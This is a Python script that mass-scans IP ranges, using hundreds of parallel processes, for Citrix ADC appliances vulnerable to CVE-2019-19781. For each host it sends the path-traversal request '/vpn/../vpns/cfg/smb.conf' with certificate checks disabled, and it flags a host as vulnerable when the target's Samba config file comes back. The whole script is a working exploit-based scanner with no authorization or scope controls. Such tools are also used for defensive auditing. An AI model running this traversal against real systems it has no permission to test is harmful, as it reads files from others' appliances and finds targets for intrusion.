#!/usr/bin/env python3
"""Multiprocess scanner for CVE-2019-19781 vulnerable Citrix appliances."""

from __future__ import annotations

import argparse
import ipaddress
import multiprocessing
from typing import Iterable

import requests
from requests import ConnectTimeout, ConnectionError, ReadTimeout
from requests.exceptions import TooManyRedirects
from requests.packages.urllib3.exceptions import InsecureRequestWarning

try:
    from tool_runner import CLITool
except ModuleNotFoundError:
    from tools.tool_runner import CLITool

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class CVE201919781Scanner:
    """Coordinate multiprocessing scans against a target CIDR."""

    def __init__(self, target: str, port: str, workers: int = 512) -> None:
        self.target = target
        self.port = port
        self.workers = workers

    @staticmethod
    def worker(targets: Iterable[str], port: str) -> None:
        for target in targets:
            try:
                print(f"Testing: {target}", end="\r")

                if port == "80":
                    response = requests.get(
                        f"http://{target}:{port}/vpn/../vpns/cfg/smb.conf",
                        verify=False,
                        timeout=2,
                    )
                else:
                    response = requests.get(
                        f"https://{target}:{port}/vpn/../vpns/cfg/smb.conf",
                        verify=False,
                        timeout=2,
                    )

                body = response.content.decode(errors="ignore")
                if all(token in body for token in ["[global]", "encrypt passwords", "name resolve order"]):
                    print(
                        "[\033[89m!\033[0m] This Citrix ADC Server: "
                        f"{target} is still vulnerable to CVE-2019-19781"
                    )
                elif "Citrix" in body or response.status_code == 403:
                    print(
                        "[\033[92m*\033[0m] CITRIX Server found, "
                        f"However the server {target} is not vulnerable"
                    )

            except (ReadTimeout, TooManyRedirects, ConnectTimeout, ConnectionError):
                continue

    @staticmethod
    def parse_args() -> argparse.Namespace:
        parser = argparse.ArgumentParser(description=__doc__)
        parser.add_argument(
            "target",
            help="The target CIDR or IP address",
        )
        parser.add_argument(
            "port",
            help="Target web port (defaults to 443)",
            default="443",
            nargs="?",
        )
        return parser.parse_args()

    @classmethod
    def from_args(cls) -> "CVE201919781Scanner":
        args = cls.parse_args()
        return cls(target=args.target, port=args.port)

    def run(self) -> None:
        ip_list = [str(ip) for ip in ipaddress.IPv4Network(self.target)]
        amount = max(1, round(len(ip_list) / self.workers))
        limit = amount

        jobs = []
        for _ in range(self.workers):
            chunk = ip_list[limit - amount : limit]
            if not chunk:
                break
            process = multiprocessing.Process(target=self.worker, args=(chunk, self.port))
            jobs.append(process)
            process.start()
            limit += amount

        for job in jobs:
            job.join()


def main() -> None:
    scanner = CVE201919781Scanner.from_args()
    scanner.run()


if __name__ == "__main__":
    CLITool(main).run()
